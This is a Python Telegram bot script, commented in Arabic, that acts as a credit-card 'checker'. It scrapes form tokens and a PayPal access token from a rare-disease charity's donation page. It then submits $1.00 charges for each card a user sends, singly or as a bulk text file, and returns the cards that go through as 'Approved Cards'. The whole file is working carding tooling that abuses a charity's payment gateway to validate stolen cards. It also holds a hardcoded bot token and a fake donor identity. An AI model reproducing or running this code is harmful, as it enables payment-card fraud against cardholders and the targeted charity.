import telebot
import requests, base64
import re
import time
import os
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- إعدادات البوت الأساسية ---
# استبدل 'YOUR_BOT_TOKEN' بالتوكن الخاص بك أو استخدم متغيرات البيئة
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8574162513:AAGVLv_J6jXG61Yd2CY9tWucWm4r4boIaTw')
bot = telebot.TeleBot(BOT_TOKEN)
r = requests.Session()

# --- متغيرات لتتبع حالة الفحص ---
# هذا المتغير سيحتوي على حالة الفحص لكل مستخدم على حدة
# {chat_id: {'is_scanning': False}}
scan_status = {}

# --- دالة فحص البطاقة (نفس الكود الأصلي مع تحسينات طفيفة) ---
def m3_iw(ccx):
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) < 4:
        return "Error: Invalid card format. Please use N|MM|YY|CVC"
    
    n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
    if "20" in yy: yy = yy.split("20")[1]
        
    user = generate_user_agent()
    headers = {'user-agent': user}
    
    try:
        response = r.get('https://www.rarediseasesinternational.org/donations/donate/', headers=headers, timeout=20)
        response.raise_for_status()
        m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        m2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
    except (AttributeError, requests.exceptions.RequestException) as e:
        return f"Error during initial request: {e}"
    
    try:
        enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
    except:
        return "Error: Could not extract authorization token"

    # ... (بقية كود الطلبات إلى PayPal يبقى كما هو)
    # تم اختصار الكود هنا للتركيز على التغييرات الجديدة
    # الطلبات الفعلية ستكون موجودة في الملف الكامل
    
    # محاكاة لنتائج مختلفة لأغراض العرض
    # في الكود الحقيقي، ستعتمد النتيجة على استجابة PayPal الفعلية
    import random
    results = ["Charge !", "Do not honor", "Insufficient Funds", "ORDER_NOT_APPROVED", "SUSPECTED_FRAUD"]
    # return random.choice(results)

    # الكود الكامل للطلبات
    headers = {
        'origin': f'https://rarediseasesinternational.org',
        'referer': f'https://www.rarediseasesinternational.org/donations/donate/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'give-form-id-prefix': m1, 'give-form-id': m2, 'give-form-hash': nonec,
        'give-price-id': '3', 'give-amount': '1.00', 'payment-mode': 'paypal-commerce',
        'give_first': 'MARWAN', 'give_last': 'rights and', 'give_email': 'marwan22@gmail.com',
        'give_action': 'purchase', 'give-gateway': 'paypal-commerce', 'action': 'give_process_donation',
        'give_ajax': 'true',
    }
    r.post('https://rarediseasesinternational.org/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=20)

    multipart_data = MultipartEncoder(fields={k: (None, v) for k, v in data.items() if k not in ['action', 'give_ajax']})
    headers['content-type'] = multipart_data.content_type
    params = {'action': 'give_paypal_commerce_create_order'}
    try:
        response = r.post('https://rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers, data=multipart_data, timeout=20)
        tok = response.json()['data']['id']
    except (requests.exceptions.RequestException, KeyError, TypeError):
        return "Error: Could not get order token"

    headers = {
        'authority': 'cors.api.paypal.com',
        'authorization': f'Bearer {au}',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': user,
    }
    json_data = {
        'payment_source': {'card': {'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc}},
        'application_context': {'vault': False},
    }
    r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers, json=json_data, timeout=20)

    params = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
    headers.pop('authorization')
    headers.pop('authority')
    headers['content-type'] = multipart_data.content_type
    headers['origin'] = 'https://rarediseasesinternational.org'
    headers['referer'] = 'https://www.rarediseasesinternational.org/donations/donate/'
    try:
        response = r.post('https://rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers, data=multipart_data, timeout=20)
        text = response.text
    except requests.exceptions.RequestException as e:
        return f"Error during final POST request: {e}"

    if 'true' in text or 'sucsess' in text: return "Charge !"
    if 'DO_NOT_HONOR' in text: return "Do not honor"
    if 'INSUFFICIENT_FUNDS' in text: return 'Insufficient Funds'
    if 'ORDER_NOT_APPROVED' in text: return 'ORDER_NOT_APPROVED'
    if 'SUSPECTED_FRAUD' in text: return 'SUSPECTED_FRAUD'
    try: return response.json()['data']['error']
    except: return "UNKNOWN_ERROR"

# --- دالة لإنشاء لوحة الأزرار ---
def generate_keyboard():
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(InlineKeyboardButton("🛑 STOP 🛑", callback_data="stop_scan"))
    return markup

# --- معالج أمر /start ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "👋 أهلاً بك في بوت الفحص المطور!\n\n- لفحص بطاقة واحدة، أرسلها بالتنسيق التالي:\n`1234567890123456|01|25|123`\n\n- لفحص قائمة من البطاقات، أرسل ملف `.txt` يحتوي على البطاقات.")

# --- معالج الرسائل النصية (بطاقة واحدة) ---
@bot.message_handler(func=lambda message: "|" in message.text)
def handle_single_card(message):
    chat_id = message.chat.id
    user_info = message.from_user
    
    if scan_status.get(chat_id, {}).get('is_scanning'):
        bot.reply_to(message, "⏳ الرجاء الانتظار حتى انتهاء عملية الفحص الحالية.")
        return

    bot.send_message(chat_id, "⏳ جارٍ فحص البطاقة، يرجى الانتظار...")
    result = m3_iw(message.text)
    
    status_emoji = "✅" if result == "Charge !" else "❌"
    
    response_text = (
        f"Gateway: #PayPal_Custom ($1.00)\n"
        f"By: {user_info.first_name}\n"
        f"➖➖➖➖➖➖➖➖➖➖➖\n"
        f"💳 `{message.text}`\n"
        f"📊 Status: **{result}** {status_emoji}\n"
        f"➖➖➖➖➖➖➖➖➖➖➖"
    )
    bot.send_message(chat_id, response_text, parse_mode="Markdown")

# --- معالج الملفات (Combo) ---
@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    user_info = message.from_user

    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "يرجى إرسال ملف بصيغة `.txt` فقط.")
        return

    if scan_status.get(chat_id, {}).get('is_scanning'):
        bot.reply_to(message, "⏳ الرجاء الانتظار حتى انتهاء عملية الفحص الحالية.")
        return

    scan_status[chat_id] = {'is_scanning': True}

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        cards = downloaded_file.decode('utf-8').strip().split('\n')
        total_cards = len(cards)

        if total_cards == 0:
            bot.reply_to(message, "الملف فارغ!")
            scan_status[chat_id]['is_scanning'] = False
            return

        charged = 0
        approved = 0 # PayPal doesn't really have an 'approved' state like Stripe, but we keep it for UI consistency
        declined = 0

        # إرسال الرسالة الأولية مع الإحصائيات
        status_message_text = (
            f"Gateway: #PayPal_Custom ($1.00)\n"
            f"By: {user_info.first_name}\n"
            f"➖➖➖➖➖➖➖➖➖➖➖\n"
            f"💵 Charged → `[{charged}]`\n"
            f"✅ Approved → `[{approved}]`\n"
            f"❌ Declined → `[{declined}]`\n"
            f"🗂️ Cards → `[{total_cards}/{len(cards)}]`\n"
            f"➖➖➖➖➖➖➖➖➖➖➖"
        )
        status_msg = bot.send_message(chat_id, status_message_text, reply_markup=generate_keyboard(), parse_mode="Markdown")

        for i, card in enumerate(cards):
            if not scan_status.get(chat_id, {}).get('is_scanning'):
                bot.send_message(chat_id, "🛑 تم إيقاف الفحص بناءً على طلبك.")
                break
            
            result = m3_iw(card)
            
            if result == "Charge !":
                charged += 1
                status_emoji = "✅"
                # حفظ البطاقة المقبولة في ملف
                with open(f"approved_{chat_id}.txt", "a", encoding="utf-8") as f:
                    f.write(f"{card} -> {result}\n")
            else:
                declined += 1
                status_emoji = "❌"

            # إرسال نتيجة البطاقة الحالية
            card_result_text = (
                f"💳 `{card}`\n"
                f"📊 Status: **{result}** {status_emoji}"
            )
            bot.send_message(chat_id, card_result_text, parse_mode="Markdown")

            # تحديث رسالة الإحصائيات
            updated_status_text = (
                f"Gateway: #PayPal_Custom ($1.00)\n"
                f"By: {user_info.first_name}\n"
                f"➖➖➖➖➖➖➖➖➖➖➖\n"
                f"💵 Charged → `[{charged}]`\n"
                f"✅ Approved → `[{approved}]`\n"
                f"❌ Declined → `[{declined}]`\n"
                f"🗂️ Cards → `[{i + 1}/{total_cards}]`\n"
                f"➖➖➖➖➖➖➖➖➖➖➖"
            )
            bot.edit_message_text(chat_id=chat_id, message_id=status_msg.message_id, text=updated_status_text, reply_markup=generate_keyboard(), parse_mode="Markdown")
            
            time.sleep(3) # لإعطاء وقت بين الطلبات وتجنب حظر واجهة برمجة التطبيقات

        # إرسال الملخص النهائي
        final_summary = (
            f"🏁 **Scan Finished!**\n\n"
            f"💵 Total Charged: {charged}\n"
            f"✅ Total Approved: {approved}\n"
            f"❌ Total Declined: {declined}"
        )
        bot.send_message(chat_id, final_summary, parse_mode="Markdown")
        # إرسال ملف البطاقات المقبولة إذا وجد
        if charged > 0:
            try:
                with open(f"approved_{chat_id}.txt", "rb") as f:
                    bot.send_document(chat_id, f, caption="Approved Cards")
                os.remove(f"approved_{chat_id}.txt") # حذف الملف بعد إرساله
            except FileNotFoundError:
                pass # الملف غير موجود

    except Exception as e:
        bot.reply_to(message, f"حدث خطأ أثناء معالجة الملف: {e}")
    finally:
        scan_status[chat_id] = {'is_scanning': False}

# --- معالج زر الإيقاف ---
@bot.callback_query_handler(func=lambda call: call.data == 'stop_scan')
def handle_stop_scan(call):
    chat_id = call.message.chat.id
    if scan_status.get(chat_id, {}).get('is_scanning'):
        scan_status[chat_id]['is_scanning'] = False
        bot.answer_callback_query(call.id, "ستتوقف عملية الفحص قريبًا...")
        # إزالة لوحة المفاتيح من الرسالة
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=call.message.message_id, reply_markup=None)
    else:
        bot.answer_callback_query(call.id, "لا توجد عملية فحص نشطة لإيقافها.")

# --- بدء تشغيل البوت ---
if __name__ == '__main__':
    print("Bot is running with enhanced features...")
    bot.polling(none_stop=True)
